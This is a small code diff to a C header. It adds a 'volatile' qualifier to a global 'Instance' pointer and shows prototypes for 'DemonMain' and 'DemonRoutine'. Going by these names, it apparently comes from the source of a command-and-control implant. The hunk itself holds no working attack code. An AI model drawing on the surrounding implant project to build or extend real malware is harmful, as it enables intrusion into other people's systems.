@@ -556,7 +556,7 @@ typedef struct
 
 } INSTANCE, *PINSTANCE;
 
-extern PINSTANCE Instance;
+extern volatile PINSTANCE Instance;
 
 VOID DemonMain( PVOID ModuleInst, PKAYN_ARGS KArgs );
 VOID DemonRoutine( );
